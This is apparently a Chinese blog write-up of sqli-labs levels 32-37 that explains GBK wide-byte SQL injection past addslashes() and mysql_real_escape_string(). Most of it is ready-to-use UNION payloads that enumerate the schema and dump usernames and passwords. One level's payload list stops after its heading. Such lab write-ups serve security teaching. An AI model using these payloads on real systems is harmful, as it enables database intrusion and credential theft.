# sqli-labs靶场(5)宽字节注入


sqli-labs靶场精简记录32-37

<!--more-->

### Less-32 Bypass addslashes()

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
    
    return $string;
}
```

使用preg_replace函数将 斜杠，单引号和双引号过滤

**宽字节注入原理**

MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 `%aa%5c` 就是一个 汉字。

使用`%df`去除`/`

`urlencode(\') = %5c%27`，我们在 `%5c%27` 前面添加 `%df`，形 成 `%df%5c%27`，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把 `%df%5c` 当做是一个汉字`運`，`%27` 则作为一个单独的符号在外面，此时`'`就逃逸出来了。



bypass

 使用`%df`宽字节注入来消除反斜杠

payload

```
爆库:
-1%df%27 union select 1,2,database()--+
爆表：
-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
或者将security转换为16进制:
-1%df%27 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479--+
爆字段:
user转换为16进制：0x7573657273
-1%df%27 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+
爆数据:
-1%df%27 union select 1,group_concat(username,0x7e,password),3 from security.users--+
或者
-1%df%27 union select 1,group_concat(username,0x7e,password),3 from users--+
```

### Less-33 Bypass addslashes()

bypass和payload同上题

### Less-34 Bypass Add SLASHES

基于错误 POST 单引号字符型 addslashes () 宽字节注入

bypass和payload同上题

### Less-35 why care for addslashes()

基于错误 GET 数字型 addslashes () 宽字节注入

数字型，注入语句出现的引号里面的数据需要转换为十六进制

payload

```
爆库:
-1 union select 1,2,database()--+
爆表:
-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+
爆字段:
-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 and table_schema=0x7365637572697479--+
爆数据:
```

### Less-36 Bypass MySQL Real Escape String

```
function check_quotes($string)
{
    $string= mysql_real_escape_string($string);    
    return $string;
}
```

```
mysql_real_escape_string()函数转义的特殊字符 \x00 \n \r \ ' " \x1a
```

GBK编码，宽字节注入

payload

```
爆位置:
0%bb%5c%5c%27 union select 1,2,3-- #
爆数据库:
-1%E6' union select 1,2,database()--+
爆表:
-1%E6' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 --+
爆列名:
-1%E6' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+
爆值:
-1%E6' union select 1,group_concat(username,0x7e,password),3 from security.users --+
```

### Less-37- MySQL_real_escape_string

post请求，payload同上题
